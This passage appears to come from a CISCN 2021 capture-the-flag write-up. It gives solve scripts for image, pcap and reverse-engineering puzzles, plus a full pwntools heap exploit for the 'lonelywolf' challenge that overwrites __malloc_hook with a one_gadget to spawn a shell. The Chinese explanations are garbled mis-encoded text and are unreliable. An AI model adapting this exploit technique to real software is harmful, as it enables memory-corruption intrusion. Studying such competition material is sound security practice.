class="language-python"><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">15100450</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"e2345"</span><span class="token operator">+</span><span class="token string">"7889b0"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">16453958</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"d172a38dc"</span></code></pre><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</code></pre><hr><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>ä¸‹è½½ä¸ºgifï¼ŒPhotoshopæ‰“å¼€å‘ç°æœ‰å‡ ç™¾å¸§ï¼Œä»”ç»†è§‚å¯Ÿå‘ç°æ¯å¸§ä¸Šæœ‰å¥‡æ€ªåƒç´ ç‚¹ï¼ŒRGBå€¼ä¸º(233,233,233)</p><img src="/article/ciscn2021/image-20210516045206693.png" class="" title="image-20210516045206693" loading="lazy"><p>åˆ©ç”¨convertè¿›è¡ŒæŠ½å¸§</p><pre class="language-sh" data-language="sh"><code class="language-sh">convert .&#x2F;running_pixel.gif .&#x2F;output&#x2F;out%05d.png</code></pre><p>æŠŠæ¯å¼ å›¾RGB(233,233,233)åƒç´ çš„åæ ‡æå–å‡ºæ¥æ”¾æ–‡æ¡£é‡Œ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./output/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagewidth <span class="token operator">=</span> <span class="token number">400</span>height <span class="token operator">=</span> <span class="token number">400</span><span class="token keyword">def</span> <span class="token function">get_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>    coordinates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    out_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./list.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g <span class="token punctuation">,</span>b <span class="token operator">=</span> pixel<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">==</span> g <span class="token operator">==</span> b <span class="token operator">==</span> <span class="token number">233</span><span class="token punctuation">:</span>                coordinate <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>                out_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>coordinate <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token comment"># print(r, g, b)</span>    <span class="token keyword">return</span> coordinates  <span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        pic <span class="token operator">=</span> get_files<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        coors <span class="token operator">=</span> get_rgb<span class="token punctuation">(</span>pic<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°æ‰€æœ‰åƒç´ ç‚¹åç”»å›¾ï¼Œä½¿ç”¨ç°æˆè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'list.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°å¦‚ä¸‹å›¾</p><img src="/article/ciscn2021/image-20210516051514950.png" class="" title="image-20210516051514950" loading="lazy"><p>çº¯æ‰‹åŠ¨ä¸€ç‚¹ä¸€ç‚¹æ…¢æ…¢æ‹¼å‡ºäº†flag</p><img src="/article/ciscn2021/image-20210515184657362.png" class="" title="image-20210515184657362" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;12504d0f-9de1-4b00-87a5-a5fdd0986a00&#125;</code></pre><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p><code>strings cap.pcapng</code>å¯ä»¥çœ‹åˆ°æœ‰åæ ‡è½´ï¼Œåæ ‡è½´ä¸ºä¸‰ç»´åæ ‡ï¼Œä½†ç”±äºzè½´å¤§å¤šæ•°ä¸º0ï¼Œæ‰€ä»¥å¯ä»¥ç”¨äºŒç»´ç”»å›¾ï¼Œ</p><img src="/article/ciscn2021/image-20210517144021953.png" class="" title="image-20210517144021953" loading="lazy"><p>ç›´æ¥ç”¨ä¸Šé¢çš„è„šæœ¬ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'zuobiao.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag_image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"./flag.png"</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°å›¾ç‰‡ï¼š</p><img src="/article/ciscn2021/image-20210517144052457.png" class="" title="image-20210517144052457" loading="lazy"><p>md5åŠ å¯†ä¹‹åå°±å¾—åˆ°flagï¼šCISCN{d4f1fb80bc11ffd722861367747c0f10}</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h3><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> base64context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('127.0.0.1',12345)</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./lonelywolf'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> binary<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x521</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>edit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x70</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h3><pre class="language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x9e</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x5</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x4f</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x3f</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token string">'12345678'</span>number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    number<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    b <span class="token operator">=</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token punctuation">(</span>c <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>    number<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> number<span class="token punctuation">[</span>c<span class="token punctuation">]</span>    number<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> b    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> number<span class="token punctuation">[</span><span class="token punctuation">(</span>b <span class="token operator">+</span> number<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><h3 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h3><p>ç”¨åˆ° LLVMï¼Œå†IDAæ‰“å¼€</p><p>ä¸¤ä¸ªå‡½æ•°ï¼Œå†™äº†å„ç§é™åˆ¶</p><pre class="language-none"><code class="language-none">æ¨ªrow 0001 1000 2001 0000 1010map[0][3] &gt; map[0][4]map[1][0] &gt; map[1][1]map[2][0] &lt; map[2][1]map[2][3] &gt; map[2][4]map[4][0] &gt; map[4][1]map[4][2] &gt; map[4][3]çºµcol 00202 00000 00010 01001map[0][2] &gt; map[1][2]map[0][4] &gt; map[1][4]map[2][3] &lt; map[3][3]map[3][1] &lt; map[4][1]map[3][4] &lt; map[4][3]</code></pre><p>expï¼š</p><pre class="language-python" data-language="python"><code class="language-python">num1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3  <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i4 <span class="token operator">&lt;=</span> 